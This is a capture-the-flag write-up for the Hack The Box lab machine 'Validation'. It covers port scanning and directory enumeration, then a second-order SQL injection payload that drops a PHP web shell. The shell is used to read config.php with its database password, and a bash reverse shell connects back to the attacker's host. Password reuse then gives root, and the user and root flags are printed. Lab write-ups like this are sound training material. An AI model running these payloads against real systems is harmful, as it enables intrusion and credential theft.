@@ -1,0 +1,131 @@
+Validation: Vulnerabilities:Second Order SQL Injection, Exposed Sensitive Files
+
+Enumeration:
+
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.95.235 
+
+PORT     STATE    SERVICE        VERSION
+22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
+|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
+|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
+80/tcp   open     http           Apache httpd 2.4.48 ((Debian))
+|_http-server-header: Apache/2.4.48 (Debian)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+4566/tcp open     http           nginx
+|_http-title: 403 Forbidden
+5000/tcp filtered upnp
+5001/tcp filtered commplex-link
+5002/tcp filtered rfe
+5003/tcp filtered filemaker
+5004/tcp filtered avt-profile-1
+5005/tcp filtered avt-profile-2
+5006/tcp filtered wsm-server
+5007/tcp filtered wsm-server-ssl
+5008/tcp filtered synapsis-edge
+8080/tcp open     http           nginx
+|_http-title: 502 Bad Gateway
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+https://help.hackthebox.com/en/ 
+
+This url takes me to take page where i can submit my username with a country, and it adds me to this database list that is displayed on http://10.129.95.235/account.php 
+
+Let’s run gobuster and nikto
+gobuster dir -u http://10.129.95.235/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+nikto -h http://10.129.95.235/
+
+ 
+Burpe suite HTTP request:
+POST / HTTP/1.1
+Host: 10.129.95.235
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.129.95.235/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+Origin: http://10.129.95.235
+DNT: 1
+Connection: close
+Cookie: user=65d2fbf36f49151209a1331966019991
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+username=hello2213123&country=Brazil
+
+Response:
+
+HTTP/1.1 302 Found
+Date: Sun, 21 Jul 2024 03:11:28 GMT
+Server: Apache/2.4.48 (Debian)
+X-Powered-By: PHP/7.4.23
+Set-Cookie: user=65d2fbf36f49151209a1331966019991
+Location: /account.php
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+PHP/7.4.23
+
+We also discovered second order sql injection.
+
+Given two requests:
+POST / HTTP/1.1
+Host: 10.129.95.235
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.129.95.235/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 125
+Origin: http://10.129.95.235
+DNT: 1
+Connection: close
+Cookie: user=5d41402abc4b2a76b9719d911017c592
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+username=hello1&country=Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE
+'/var/www/html/shell.php'-- -
+
+This payload will drop a shell.php that allows us to execute system commands
+
+└──╼ [★]$ curl http://10.129.95.235/shell.php?cmd=id
+hello2
+hello2213123
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+└──╼ [★]$ curl "http://10.129.95.235/shell.php?cmd=cat config.php"
+curl: (3) URL using bad/illegal format or missing URL
+┌─[us-dedivip-1]─[10.10.14.30]─[joshnguyen08@htb-0v1gfmabxg]─[~]
+└──╼ [★]$ curl "http://10.129.95.235/shell.php?cmd=cat%20config.php"
+hello2
+hello2213123
+<?php
+  $servername = "127.0.0.1";
+  $username = "uhc";
+  $password = "uhc-9qual-global-pw";
+  $dbname = "registration";
+
+  $conn = new mysqli($servername, $username, $password, $dbname);
+?>
+
+nc -nlvp 4444
+
+curl http://10.129.95.235/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.30/4444 0>&1"'
+
+su and login with the password from config.php and now we have root access.
+
+cat user.txt
+ba0200f496d860b317df8623aa620640
+
+cat root.txt
+9eda203dc5955ecb21e9006f5aa1ead7
+
